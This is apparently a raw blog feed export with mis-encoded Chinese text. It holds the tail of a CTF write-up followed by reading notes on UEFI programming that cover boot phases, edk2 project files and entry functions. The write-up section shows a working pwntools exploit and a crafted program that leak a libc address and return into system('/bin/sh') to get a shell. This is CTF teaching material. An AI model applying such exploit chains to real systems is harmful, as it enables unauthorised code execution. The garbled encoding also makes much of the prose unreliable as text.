title="exp3"></a>exp3</h2><p>GlobalCSEæœªåˆå§‹åŒ–æ³„æ¼libc + WHILEä¸­ret</p><ul><li><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment">#p=process(&#x27;./test&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">9999</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;exp.klang&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    content=file.read()<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Give me your code, ended by a line with \&#x27;END_OF_SNIPPET\&#x27; (excluding quote).&#x27;</span>,content.encode())<br>p.sendline(<span class="hljs-string">b&#x27;END_OF_SNIPPET&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>rdi=<span class="hljs-number">0x4018c3</span><br>ret=<span class="hljs-number">0x40101a</span><br>binsh=<span class="hljs-number">0x404098</span><br>p.recvline()<br>libcbase=<span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">1</span>].decode())-<span class="hljs-number">0xe2d9b</span><br>p.sendline(<span class="hljs-built_in">str</span>(rdi).encode())<br>p.sendline(<span class="hljs-built_in">str</span>(binsh).encode())<br>p.sendline(<span class="hljs-built_in">str</span>(libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]).encode())<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure></li><li><p>exp.klang</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">main</span><span class="hljs-params">()</span> : <span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b, <span class="hljs-type">int</span> c, <span class="hljs-type">int</span> d -&gt; <span class="hljs-type">int</span><br>&#123;<br>leak_libc(<span class="hljs-number">123</span>, <span class="hljs-number">456</span>);<br>a := inputi();<br>b := inputi();<br>c := inputi();<br>d := inputi();<br>prints(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><span class="hljs-keyword">do</span><br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">while</span>(inputi());<br>a := dup(a);<br>b := dup(b);<br>c := dup(c);<br>d := dup(d);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>function <span class="hljs-title function_">leak_libc</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> :  <span class="hljs-type">int</span> c, <span class="hljs-type">int</span> d-&gt; <span class="hljs-type">int</span><br>&#123;<br>c := a + <span class="hljs-number">1</span>;<br>printi(c);<br><span class="hljs-keyword">if</span> (b &gt; <span class="hljs-number">100</span>)<br>&#123;<br>d := a + <span class="hljs-number">1</span>;<br>&#125;;<br><span class="hljs-keyword">return</span> d;<br>&#125;<br><br>function <span class="hljs-title function_">dup</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span> : -&gt; <span class="hljs-type">int</span><br>&#123;<br><span class="hljs-keyword">return</span> a * a;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€ŠUEFIåŸç†ä¸ç¼–ç¨‹ã€‹è¯»ä¹¦ç¬”è®°</title>
    <link href="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>wjyåˆåŒå’å•å¼€å§‹èµ°æ”¯çº¿äº†â€¦â€¦ç»å…¸å­¦æ–°ä¸œè¥¿ä¸€æœ¬ä¹¦èµ·æ­¥</p><span id="more"></span><h1 id="UEFIæ¦‚è¿°"><a href="#UEFIæ¦‚è¿°" class="headerlink" title="UEFIæ¦‚è¿°"></a>UEFIæ¦‚è¿°</h1><h2 id="UEFIç³»ç»Ÿç»„æˆ"><a href="#UEFIç³»ç»Ÿç»„æˆ" class="headerlink" title="UEFIç³»ç»Ÿç»„æˆ"></a>UEFIç³»ç»Ÿç»„æˆ</h2><img src="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E7%B3%BB%E7%BB%9F%E7%BB%84%E6%88%90.png" class title="ç³»ç»Ÿç»„æˆ"><ul><li>TSLé˜¶æ®µBSæä¾›çš„æœåŠ¡ï¼š<ul><li>äº‹ä»¶æœåŠ¡</li><li>å†…å­˜ç®¡ç†</li><li>Protocolç®¡ç†</li><li>Protocolä½¿ç”¨ç±»æœåŠ¡</li><li>é©±åŠ¨ç®¡ç†</li><li>Imageç®¡ç†</li><li>ExitBootService</li></ul></li><li>RTæä¾›çš„æœåŠ¡ï¼š<ul><li>æ—¶é—´æœåŠ¡</li><li>è¯»å†™UEFIç³»ç»Ÿå˜é‡</li><li>è™šæ‹Ÿå†…å­˜æœåŠ¡</li><li>å…¶ä»–æœåŠ¡ï¼Œå¦‚é‡å¯ç³»ç»Ÿçš„ResetSystem</li></ul></li></ul><h2 id="UEFIå¯åŠ¨è¿‡ç¨‹"><a href="#UEFIå¯åŠ¨è¿‡ç¨‹" class="headerlink" title="UEFIå¯åŠ¨è¿‡ç¨‹"></a>UEFIå¯åŠ¨è¿‡ç¨‹</h2><img src="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/uefi7.png" class title="uefi7"><h3 id="SEC"><a href="#SEC" class="headerlink" title="SEC"></a>SEC</h3><h4 id="SECé˜¶æ®µåŠŸèƒ½"><a href="#SECé˜¶æ®µåŠŸèƒ½" class="headerlink" title="SECé˜¶æ®µåŠŸèƒ½"></a>SECé˜¶æ®µåŠŸèƒ½</h4><ul><li>æ¥å—å¹¶å¤„ç†ç³»ç»Ÿå¯åŠ¨å’Œé‡å¯ä¿¡å·</li><li>åˆå§‹åŒ–ä¸´æ—¶å­˜å‚¨åŒºåŸŸ</li><li>ä½œä¸ºå¯ä¿¡ç³»ç»Ÿçš„æ ¹</li><li>ä¼ é€’ç³»ç»Ÿå‚æ•°ç»™ä¸‹ä¸€é˜¶æ®µPEI<ul><li>ç³»ç»Ÿå½“å‰çŠ¶æ€</li><li>BFMçš„åœ°å€å’Œå¤§å°</li><li>ä¸´æ—¶RAMçš„åœ°å€å’Œå¤§å°</li><li>æ ˆçš„åœ°å€å’Œå¤§å°</li></ul></li></ul><h4 id="SECæ‰§è¡Œæµç¨‹"><a href="#SECæ‰§è¡Œæµç¨‹" class="headerlink" title="SECæ‰§è¡Œæµç¨‹"></a>SECæ‰§è¡Œæµç¨‹</h4><img src="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/sec.png" class title="sec"><p>ä»¥åˆå§‹åŒ–ä¸´æ—¶RAMä¸ºç•Œï¼ŒSECåˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼š</p><ul><li>Reset Vector</li><li>SECåŠŸèƒ½åŒº</li></ul><p>Reset Vectoræ‰§è¡Œæµç¨‹ï¼š</p><ul><li>è¿›å…¥å›ºä»¶å…¥å£</li><li>ä»å®æ¨¡å¼è½¬32ä½å¹³å¦æ¨¡å¼</li><li>å®šä½å›ºä»¶ä¸­çš„BFV</li><li>å®šä½å›ºä»¶ä¸­çš„SECæ˜ åƒ</li><li>è‹¥æ˜¯64ä½ç³»ç»Ÿï¼Œä»32ä½æ¨¡å¼è½¬æ¢åˆ°64ä½æ¨¡å¼</li><li>è°ƒç”¨SECå…¥å£å‡½æ•°</li></ul><h3 id="PEI"><a href="#PEI" class="headerlink" title="PEI"></a>PEI</h3><p>ä¸»è¦åŠŸèƒ½æ˜¯ä¸ºDXEå‡†å¤‡æ‰§è¡Œç¯å¢ƒï¼Œå°†éœ€è¦ä¼ é€’åˆ°DXEçš„ä¿¡æ¯ç»„æˆHOBåˆ—è¡¨</p><p>ä»åŠŸèƒ½ä¸Šè®²PEIåˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼š</p><ul><li>PEIå†…æ ¸ï¼šè´Ÿè´£PEIåŸºç¡€æœåŠ¡å’Œæ‰§è¡Œæµç¨‹</li><li>PEIMæ´¾é£å™¨ï¼šæ‰¾å‡ºç³»ç»Ÿä¸­æ‰€æœ‰PEIMï¼Œæ ¹æ®ä¾èµ–å…³ç³»é¡ºåºæ‰§è¡Œ</li></ul><img src="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/pei.png" class title="pei"><p>PEIMä¹‹é—´é€šè¿‡PPIé€šä¿¡ï¼Œå¯é€šè¿‡GUIDå®šä½</p><h3 id="DXE"><a href="#DXE" class="headerlink" title="DXE"></a>DXE</h3><p>ä»åŠŸèƒ½ä¸Šè®²DXEåˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼š</p><ul><li>DXEå†…æ ¸ï¼šè´Ÿè´£DXEåŸºç¡€æœåŠ¡å’Œæ‰§è¡Œæµç¨‹</li><li>DXEæ´¾é£å™¨ï¼šè´Ÿè´£è°ƒåº¦æ‰§è¡ŒDXEé©±åŠ¨ï¼Œåˆå§‹åŒ–ç³»ç»Ÿè®¾å¤‡</li></ul><img src="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/dxe.png" class title="dxe"><p>DXEä¹‹é—´é€šè¿‡Protocolé€šä¿¡ï¼Œå¯é€šè¿‡GUIDå®šä½</p><h3 id="BDS"><a href="#BDS" class="headerlink" title="BDS"></a>BDS</h3><p>ä¸»è¦åŠŸèƒ½æ˜¯æ‰§è¡Œå¯åŠ¨ç­–ç•¥ï¼ŒåŒ…æ‹¬ï¼š</p><ul><li>åˆå§‹åŒ–æ§åˆ¶å°è®¾å¤‡</li><li>åŠ è½½å¿…è¦çš„è®¾å¤‡é©±åŠ¨</li><li>æ ¹æ®ç³»ç»Ÿè®¾ç½®åŠ è½½å’Œæ‰§è¡Œå¯åŠ¨é¡¹</li></ul><p>åŠ è½½å¯åŠ¨é¡¹å¤±è´¥ï¼Œç³»ç»Ÿå°†é‡æ–°æ‰§è¡ŒDXE dispatcherä»¥åŠ è½½æ›´å¤šçš„é©±åŠ¨ï¼Œç„¶åé‡æ–°å°è¯•åŠ è½½å¯åŠ¨é¡¹</p><h3 id="TSL"><a href="#TSL" class="headerlink" title="TSL"></a>TSL</h3><p>OS Loaderæ‰§è¡Œçš„ç¬¬ä¸€ä¸ªé˜¶æ®µ</p><ul><li>OS Loaderä½œä¸ºä¸€ä¸ªUEFIåº”ç”¨ç¨‹åºè¿è¡Œï¼Œç³»ç»Ÿèµ„æºä»ç„¶ç”±UEFIå†…æ ¸æ§åˆ¶</li><li>ExitBootServicesæœåŠ¡è¢«è°ƒç”¨åï¼Œç³»ç»Ÿè¿›å…¥RTé˜¶æ®µ</li></ul><p>TSLæ˜¯ä¸€ä¸ªä¸´æ—¶ç³»ç»Ÿï¼ŒUEFI Shellæ˜¯è¿™ä¸ªä¸´æ—¶ç³»ç»Ÿçš„äººæœºäº¤äº’ç•Œé¢</p><h3 id="RT"><a href="#RT" class="headerlink" title="RT"></a>RT</h3><ul><li>ç³»ç»Ÿæ§åˆ¶æƒå’Œèµ„æºç”±UEFIå†…æ ¸è½¬äº¤åˆ°OS Loaderæ‰‹ä¸­</li><li>è¿è¡Œæ—¶æœåŠ¡ä¿ç•™ç»™OSå’ŒOS Loaderä½¿ç”¨</li><li>æœ€ç»ˆOSå–å¾—ç³»ç»Ÿçš„æ§åˆ¶æƒ</li></ul><h3 id="AL"><a href="#AL" class="headerlink" title="AL"></a>AL</h3><p>RTé˜¶æ®µé”™è¯¯å¤„ç†ï¼Œæœªå®šä¹‰</p><h1 id="UEFIå·¥ç¨‹æ¨¡å—æ–‡ä»¶"><a href="#UEFIå·¥ç¨‹æ¨¡å—æ–‡ä»¶" class="headerlink" title="UEFIå·¥ç¨‹æ¨¡å—æ–‡ä»¶"></a>UEFIå·¥ç¨‹æ¨¡å—æ–‡ä»¶</h1><p>å„UEFIå·¥ç¨‹æ–‡ä»¶ä¹‹é—´çš„å…³ç³»</p><p>*Pkgï¼šåŒ…</p><ul><li>.dscï¼šå¹³å°æè¿°æ–‡ä»¶</li><li>.decï¼šåŒ…ç”³æ˜æ–‡ä»¶</li><li>æ¨¡å—ï¼ˆç¼–è¯‘å®Œå°±æ˜¯.efiï¼‰<ul><li>.infï¼šå…ƒæ•°æ®æ–‡ä»¶</li><li>æºæ–‡ä»¶</li></ul></li></ul><table><thead><tr><th align="left">æ¨¡å—ç±»å‹</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">æ ‡å‡†åº”ç”¨ç¨‹åºå·¥ç¨‹æ¨¡å—</td><td align="left">åœ¨DXEé˜¶æ®µè¿è¡Œçš„åº”ç”¨ç¨‹åºï¼ˆShellç¯å¢ƒä¸‹ä¹Ÿå¯ä»¥è¿è¡Œï¼‰</td></tr><tr><td align="left">ShellAppMainåº”ç”¨ç¨‹åºå·¥ç¨‹æ¨¡å—</td><td align="left">Shellç¯å¢ƒä¸‹è¿è¡Œçš„åº”ç”¨ç¨‹åº</td></tr><tr><td align="left">UEFIé©±åŠ¨æ¨¡å—</td><td align="left">ç¬¦åˆUEFIé©±åŠ¨æ¨¡å‹çš„é©±åŠ¨ï¼Œä»…åœ¨BSæœŸé—´æœ‰æ•ˆ</td></tr><tr><td align="left">åº“æ¨¡å—</td><td align="left">ä½œä¸ºé™æ€åº“è¢«å…¶ä»–æ¨¡å—è°ƒç”¨</td></tr><tr><td align="left">DXEé©±åŠ¨æ¨¡å—</td><td align="left">DXEç¯å¢ƒä¸‹è¿è¡Œçš„é©±åŠ¨ï¼Œæ­¤ç±»é©±åŠ¨ä¸éµå¾ªUEFIé©±åŠ¨æ¨¡å‹</td></tr><tr><td align="left">DXEè¿è¡Œæ—¶é©±åŠ¨æ¨¡å‹</td><td align="left">è¿›å…¥RTä¾ç„¶æœ‰æ•ˆçš„é©±åŠ¨</td></tr><tr><td align="left">DXE SALé©±åŠ¨æ¨¡å—</td><td align="left">ä»…å¯¹å®‰è…¾CPUæœ‰æ•ˆçš„ä¸€ç§é©±åŠ¨</td></tr><tr><td align="left">DXE SMMé©±åŠ¨æ¨¡å—</td><td align="left">ç³»ç»Ÿç®¡ç†æ¨¡å¼é©±åŠ¨ï¼Œæ¨¡å—è¢«åŠ è½½åˆ°ç³»ç»Ÿç®¡ç†å†…å­˜åŒºï¼Œç³»ç»Ÿè¿›å…¥RTä»ç„¶æœ‰æ•ˆ</td></tr><tr><td align="left">PEIMæ¨¡å—</td><td align="left">PEIé˜¶æ®µçš„æ¨¡å—</td></tr><tr><td align="left">SECæ¨¡å—</td><td align="left">å›ºä»¶çš„SECé˜¶æ®µ</td></tr><tr><td align="left">PEI_COREæ¨¡å—</td><td align="left">å›ºä»¶çš„PEIé˜¶æ®µ</td></tr><tr><td align="left">DXE_COREæ¨¡å—</td><td align="left">å›ºä»¶çš„DXEæ¨¡å—</td></tr></tbody></table><h2 id="å·¥ç¨‹æ–‡ä»¶"><a href="#å·¥ç¨‹æ–‡ä»¶" class="headerlink" title="å·¥ç¨‹æ–‡ä»¶"></a>å·¥ç¨‹æ–‡ä»¶</h2><p>edk2æ–‡ä»¶ä¸edk2å·¥å…·é“¾å‘½ä»¤ä¹‹é—´çš„å…³ç³»ï¼š</p><img src="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/file.png" class title="file"><h3 id="inf"><a href="#inf" class="headerlink" title=".inf"></a>.inf</h3><ul><li>ä½œç”¨ç›¸å½“äºMakefile</li><li>åˆ†å¾ˆå¤šä¸ªå—ï¼Œä»¥â€[å—å]\nâ€å¼€å¤´</li></ul><table><thead><tr><th>å¿…éœ€å—</th><th>å—æè¿°</th></tr></thead><tbody><tr><td>[Defines]</td><td>å®šä¹‰æœ¬æ¨¡å—çš„å±æ€§å˜é‡åŠå…¶ä»–å˜é‡ï¼Œè¿™äº›å˜é‡å¯åœ¨å·¥ç¨‹æ–‡ä»¶å…¶ä»–å—ä¸­ä½¿ç”¨</td></tr><tr><td>[Sources]</td><td>åˆ—å‡ºæœ¬æ¨¡å—æ‰€æœ‰æºæ–‡ä»¶åŠèµ„æºæ–‡ä»¶</td></tr><tr><td>[Packages]</td><td>åˆ—å‡ºæœ¬æ¨¡å—å¼•ç”¨åˆ°çš„æ‰€æœ‰åŒ…çš„åŒ…å£°æ˜æ–‡ä»¶ï¼Œå¯èƒ½å¼•ç”¨åˆ°çš„èµ„æºåŒ…æ‹¬å¤´æ–‡ä»¶ã€GUIDã€Protocolç­‰ï¼Œè¿™äº›èµ„æºéƒ½å£°æ˜åœ¨åŒ…çš„åŒ…å£°æ˜æ–‡ä»¶.decä¸­</td></tr><tr><td>[LibraryClasses]</td><td>åˆ—å‡ºæœ¬æ¨¡å—è¦é“¾æ¥çš„åº“æ¨¡å—</td></tr></tbody></table><table><thead><tr><th>éå¿…éœ€å—</th><th>å—æè¿°</th></tr></thead><tbody><tr><td>[Protocols]</td><td>åˆ—å‡ºæœ¬æ¨¡å—ç”¨åˆ°çš„Protocol</td></tr><tr><td>[Guids]</td><td>åˆ—å‡ºæœ¬æ¨¡å—ç”¨åˆ°çš„GUID</td></tr><tr><td>[BuildOptions]</td><td>æŒ‡å®šç¼–è¯‘å’Œé“¾æ¥é€‰é¡¹</td></tr><tr><td>[Pcd]</td><td>å¹³å°é…ç½®æ•°æ®åº“ï¼Œç”¨äºåˆ—å‡ºæœ¬æ¨¡å—ç”¨åˆ°çš„Pcdå˜é‡ï¼Œè¿™äº›Pcdå˜é‡å¯è¢«æ•´ä¸ªUEFIç³»ç»Ÿè®¿é—®</td></tr><tr><td>[PcdEx]</td><td>ç”¨äºåˆ—å‡ºæœ¬æ¨¡å—ç”¨åˆ°çš„Pcdå˜é‡ï¼Œè¿™äº›Pcdå˜é‡å¯è¢«æ•´ä¸ªUEFIç³»ç»Ÿè®¿é—®</td></tr><tr><td>[FixedPcd]</td><td>ç”¨äºåˆ—å‡ºæœ¬æ¨¡å—ç”¨åˆ°çš„Pcdç¼–è¯‘æœŸå¸¸é‡</td></tr><tr><td>[FeaturePcd]</td><td>ç”¨äºåˆ—å‡ºæœ¬æ¨¡å—ç”¨åˆ°çš„Pcdå¸¸é‡</td></tr><tr><td>[PatchPcd]</td><td>åˆ—å‡ºçš„Pcdå˜é‡ä»…æœ¬æ¨¡å—å¯ç”¨</td></tr></tbody></table><h3 id="dsc"><a href="#dsc" class="headerlink" title=".dsc"></a>.dsc</h3><p>ç”¨äºç¼–è¯‘ä¸€ä¸ªPackageï¼Œåˆ†ä¸ºå¥½å‡ ä¸ªå—ï¼š</p><ul><li><p>[Define]</p><ul><li><p>ç”¨äºè®¾ç½®buildç›¸å…³çš„å…¨å±€å®å˜é‡ï¼Œå¯è¢«.dscå…¶ä»–å—ä½¿ç”¨</p></li><li><p>é€šè¿‡DEFINEå’ŒEDK_GLOBALå®šä¹‰çš„å®å¯ä»¥åœ¨.dscå’Œ.fdfä¸­é€šè¿‡$+å®å˜é‡åä½¿ç”¨</p></li><li><p>å¿…é¡»å®šä¹‰çš„å®å˜é‡</p><img src="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/must.png" class title="must"></li><li><p>å¯é€‰å®å˜é‡</p><img src="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/need1.png" class title="need1"><img src="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/need2.png" class title="need2"></li></ul></li><li><p>[LibraryClasses]</p><ul><li>å®šä¹‰äº†æ¨¡å—çš„åå­—å’Œæ¨¡å—.infæ–‡ä»¶çš„è·¯å¾„</li></ul></li><li><p>[Components]</p><ul><li>è¯¥åŒºåŸŸå†…å®šä¹‰çš„æ¨¡å—éƒ½ä¼šè¢«buildå·¥å…·ç¼–è¯‘ç”Ÿæˆ.efiæ–‡ä»¶</li></ul></li><li><p>[BuildOptions]</p><ul><li>ç¼–è¯‘å’Œé“¾æ¥é€‰é¡¹</li></ul></li><li><p>[PCD]</p><ul><li>å®šä¹‰å¹³å°é…ç½®æ•°æ®</li></ul></li></ul><h3 id="dec"><a href="#dec" class="headerlink" title=".dec"></a>.dec</h3><p>å®šä¹‰äº†å…¬å¼€çš„æ•°æ®å’Œçš„æ¥å£ï¼Œä¾›å…¶ä»–æ¨¡å—ä½¿ç”¨</p><ul><li>[Defines]<ul><li>ç”¨äºæä¾›packageçš„åç§°ï¼ŒGUIDï¼Œç‰ˆæœ¬å·ç­‰ä¿¡æ¯</li></ul></li><li>[Includes]<ul><li>åˆ—å‡ºæœ¬packageæä¾›çš„å¤´æ–‡ä»¶æ‰€åœ¨ç›®å½•</li></ul></li><li>[LibraryClasses]<ul><li>å¯¹å¤–æä¾›åº“ï¼Œæ¯ä¸ªåº“éƒ½å¿…é¡»åŒ…å«ä¸€ä¸ªå¤´æ–‡ä»¶</li></ul></li><li>[Guids]<ul><li>å„ä¸ª.infæ–‡ä»¶ä¸­çš„GUIDçš„å¸¸é‡å®šä¹‰</li></ul></li><li>[Protocols]<ul><li>Protocolçš„GUIDå€¼çš„å®šä¹‰</li></ul></li><li>[Ppis]<ul><li>æºæ–‡ä»¶ä¸­ç”¨åˆ°çš„PPIçš„GUIDå€¼çš„å®šä¹‰</li></ul></li><li>[PCD]<ul><li>.dscæ–‡ä»¶ä¸­[PCD]å—çš„è¡¥å……</li></ul></li></ul><h2 id="æ ‡å‡†åº”ç”¨ç¨‹åºå·¥ç¨‹æ¨¡å—"><a href="#æ ‡å‡†åº”ç”¨ç¨‹åºå·¥ç¨‹æ¨¡å—" class="headerlink" title="æ ‡å‡†åº”ç”¨ç¨‹åºå·¥ç¨‹æ¨¡å—"></a>æ ‡å‡†åº”ç”¨ç¨‹åºå·¥ç¨‹æ¨¡å—</h2><h3 id="å…¥å£å‡½æ•°"><a href="#å…¥å£å‡½æ•°" class="headerlink" title="å…¥å£å‡½æ•°"></a>å…¥å£å‡½æ•°</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Uefi.h&gt;</span><span class="hljs-comment">// åŒ…å«åŸºæœ¬æ•°æ®ç±»å‹å’Œæ ¸å¿ƒæ•°æ®ç»“æ„</span></span><br><br>EFI_STATUS<br>EFIAPI<br><span class="hljs-title function_">UefiMain</span> <span class="hljs-params">(<span class="hljs-comment">// UEFIæ ‡å‡†åº”ç”¨ç¨‹åºé€šå¸¸çš„å…¥å£å‡½æ•°åï¼Œç”±.infä¸­çš„ENTRY_POINTå®šä¹‰</span></span><br><span class="hljs-params">  IN EFI_HANDLE        ImageHandle,</span><br><span class="hljs-params">  IN EFI_SYSTEM_TABLE  *SystemTable</span><br><span class="hljs-params">  )</span><br>&#123;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>è¿”å›ç±»å‹EFI_STATUS<ul><li>æœ¬è´¨æ— ç¬¦å·é•¿æ•´æ•°</li><li>æœ€é«˜ä½1é”™è¯¯å€¼ï¼Œæœ€é«˜ä½0éé”™è¯¯å€¼</li><li>EFI_SUCCESS&#x3D;0ï¼Œè¡¨ç¤ºæ²¡æœ‰é”™è¯¯çš„è¿”å›å€¼</li></ul></li><li>å‚æ•°<ul><li>ImageHandleï¼š<ul><li>.efiåŠ è½½åˆ°å†…å­˜åç”Ÿæˆçš„å¯¹è±¡ä¸ºImage</li><li>ImageHandleæ˜¯Imageçš„å¥æŸ„</li></ul></li><li>SystemTableï¼š<ul><li>è·å–UEFIçš„å„ç§æœåŠ¡</li><li>å…¨å±€ç»“æ„ä½“</li></ul></li></ul></li></ul><h2 id="Shellåº”ç”¨ç¨‹åºå·¥ç¨‹æ¨¡å—"><a href="#Shellåº”ç”¨ç¨‹åºå·¥ç¨‹æ¨¡å—" class="headerlink" title="Shellåº”ç”¨ç¨‹åºå·¥ç¨‹æ¨¡å—"></a>Shellåº”ç”¨ç¨‹åºå·¥ç¨‹æ¨¡å—</h2><h3 id="å…¥å£å‡½æ•°-1"><a href="#å…¥å£å‡½æ•°-1" class="headerlink" title="å…¥å£å‡½æ•°"></a>å…¥å£å‡½æ•°</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">INTN<br>EFIAPI<br><span class="hljs-title function_">ShellAppMain</span> <span class="hljs-params">(</span><br><span class="hljs-params">  IN UINTN   Argc,</span><br><span class="hljs-params">  IN CHAR16  **Argv</span><br><span class="hljs-params">  )</span><br>&#123;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ²¡æœ‰SystemTableå‚æ•°ï¼Œé€šè¿‡å…¨å±€å˜é‡gSTä½¿ç”¨ç³»ç»Ÿè¡¨</p><h2 id="UEFIé©±åŠ¨æ¨¡å—"><a href="#UEFIé©±åŠ¨æ¨¡å—" class="headerlink" title="UEFIé©±åŠ¨æ¨¡å—"></a>UEFIé©±åŠ¨æ¨¡å—</h2><ul><li>é©±åŠ¨å¸¸é©»å†…å­˜</li><li>åº”ç”¨ç¨‹åºæ‰§è¡Œå®Œæ¯•åä¼šä»å†…å­˜æ¸…æ¥š</li></ul><h3 id="å…¥å£å‡½æ•°-2"><a href="#å…¥å£å‡½æ•°-2" class="headerlink" title="å…¥å£å‡½æ•°"></a>å…¥å£å‡½æ•°</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">EFI_STATUS<br>EFIAPI<br><span class="hljs-title function_">InitializePciSioSerial</span> <span class="hljs-params">(</span><br><span class="hljs-params">  IN EFI_HANDLE        ImageHandle,</span><br><span class="hljs-params">  IN EFI_SYSTEM_TABLE  *SystemTable</span><br><span class="hljs-params">  )</span><br>&#123;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="UEFIä¸­çš„Protocol"><a href="#UEFIä¸­çš„Protocol" class="headerlink" 